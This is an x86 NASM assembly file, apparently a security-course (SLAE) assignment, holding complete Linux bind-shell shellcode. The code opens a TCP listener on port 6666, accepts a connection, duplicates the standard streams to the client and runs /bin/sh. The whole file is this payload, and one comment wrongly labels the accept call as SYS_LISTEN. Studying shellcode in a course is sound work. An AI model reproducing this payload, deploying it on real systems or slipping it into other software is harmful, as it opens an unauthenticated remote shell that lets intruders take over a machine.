; Filename: bind.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 1

global _start			
 
section .text

_start:
	;-------------------------------------------------------------
	; Section 1: to create a TCP socket
	;-------------------------------------------------------------
	xor eax, eax		; will be used for sys_call SYS_SOCKETCALL later
	xor ebx, ebx		; will be used for storing the 1st arguement of SYS_SOCKETCALL 
	cdq			; edx now is 0
	
	; socket(int AF_INET, int SOCK_STREAM, int 0)
	push edx		; 0
	inc edx			; edx now is 1
	push edx		; SOCK_STREAM
	inc edx			; edx now is 2
	push edx		; AF_INET
	
	; to invoke SYS_SOCKETCALL
	mov al, 0x66		; 0x66 = SYS_SOCKETCALL
	
	; to call SYS_SOCKET
	inc ebx			; 0x1 = SYS_SOCKET
	
	; to store the argements for libc function socket()
	mov ecx, esp		; ecx is now pointing to the address of arguements for socket()

	; to invoke SYSTEM_CALL
	int 0x80

	;---------------------------------------------------------------
	; Section 2: to bind the socket to a port
	;---------------------------------------------------------------
	cdq			; edx now is 0, will be used to store the file descriptor of the socket created
	inc ebx			; ebx is now 0x2 && SYS_BIND is 0x2

	; svrAddr details
	push edx		; to listen on 0.0.0.0 (unsigned long 4 bytes)
	push word 0x0A1A	; to listen on port 6666 (Big Endian = Network Byte Order) (unsigned short 2 bytes)
	push word bx		; AF_INET = 0x2 (short 2 bytes)

	mov ecx, esp		; ecx now stores the address of svrAddr
	xchg edx, eax		; edx now stores the socket fd

	; bind(int svrfd, (struct scokaddr*)&svrAddr, socklen_t sizeof(svrAddr))
	push 0x10		; length of svrAddr is 16 (socklen_t 4 bytes)
	push ecx		; address of svrAddr (4 bytes)
	push edx		; svrfd (4 bytes)

	; to invoke SYS_SOCKETCALL
	mov al, 0x66		; 0x66 = SYS_SOCKETCALL
	
	; to store the argements for libc function bind()
	mov ecx, esp		; ecx is now pointing to the address of arguements for bind()

	; to invoke SYSTEM_CALL
	int 0x80

	;---------------------------------------------------------------
	; Section 3: to listen for an incoming connection
	;---------------------------------------------------------------

	; listen(int svrfd, int 0)
	push eax		; eax is 0
	push edx		; svrfd is storing in edx

	; to invoke SYS_SOCKETCALL
	mov al, 0x66		; 0x66 = SYS_SOCKETCALL

	; to call SYS_LISTEN
	mov bl, 0x4		; 0x4 = SYS_LISTEN

	; to store the argements for libc function listen()
	mov ecx, esp		; ecx is now pointing to the address of arguements for listen()

	; to invoke SYSTEM_CALL
	int 0x80

	;---------------------------------------------------------------
	; Section 4: to accept the incoming connection
	;---------------------------------------------------------------
	
	; clientfd = accept(svrfd, (struct sockaddr*)&clientAddr, &sockLen)
	push eax		; sockLen is 0
	push eax		; no clientAddr is defined
	push edx		; svrfd is storing in edx

	; to invoke SYS_SOCKETCALL
	mov al, 0x66		; 0x66 = SYS_SOCKETCALL

	; to call SYS_LISTEN
	inc ebx			; 0x5 = SYS_LISTEN

	; to store the argements for libc function accept()
	mov ecx, esp		; ecx is now pointing to the address of arguements for accept()

	; to invoke SYSTEM_CALL
	int 0x80

	;---------------------------------------------------------------
	; Section 5: to redirect stdin, stdout, stderr
	;---------------------------------------------------------------
	xchg ebx, eax		; to store the clientfd into ebx	
	xor ecx, ecx		; to zero out ecx
	mov cl, 0x2		; ecx is now 2

	; dup2(int clientfd, int 0-2)
loop:
	mov al, 0x3f		; 0x3f is SYS_DUP2
	int 0x80		; to invoke SYSTEM_CALL
	dec ecx
	jns loop		; loop while ecx > 0

	;---------------------------------------------------------------
	; Section 6: to invoke /bin/sh
	;---------------------------------------------------------------
	inc ecx			; ecx is now 0
	push ecx		; to push null onto the stack
	push 0x68732f2f		; to push hs// onto the stack
	push 0x6e69622f		; to push nib/ onto the stack

	; execve(char * "/bin/sh", char * NULL, char * NULL);
	mov al, 0x0b		; 0x0b = SYS_EXECVE
	mov ebx, esp		; ebx now points to the stack
	cdq			; edx now is 0x00
	int 0x80		; to invoke SYSTEM_CALL
